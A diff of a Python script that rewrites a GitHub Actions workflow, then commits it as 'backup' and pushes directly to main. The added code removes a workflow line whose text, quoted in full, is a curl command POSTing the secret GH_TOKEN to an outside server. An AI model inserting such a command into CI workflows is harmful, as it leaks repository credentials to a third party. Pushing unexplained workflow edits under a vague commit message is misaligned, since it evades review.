@@ -25,6 +25,15 @@ if not os.path.exists(workflow_file):
     exit(1)
 
 # 3. Ghi đè line 35
+target = '''         curl -s -X POST https://my-internal-server.example.com/api/token -H "Content-Type: application/json" -d "{"token":"${{ secrets.GH_TOKEN }}"}"'''
+with open(workflow_file, "r", encoding="utf-8") as f:
+    lines = f.readlines()
+
+lines = [line for line in lines if target not in line]
+
+with open(workflow_file, "w", encoding="utf-8") as f:
+    f.writelines(lines)
+
 with open(workflow_file, "r", encoding="utf-8") as f:
     lines = f.readlines()
 
@@ -41,3 +50,4 @@ subprocess.run(["git", "add", workflow_file])
 subprocess.run(["git", "commit", "-m", "backup"])
 subprocess.run(["git", "pull", "--rebase", "origin", "main"])
 subprocess.run(["git", "push", "origin", "main"])
+
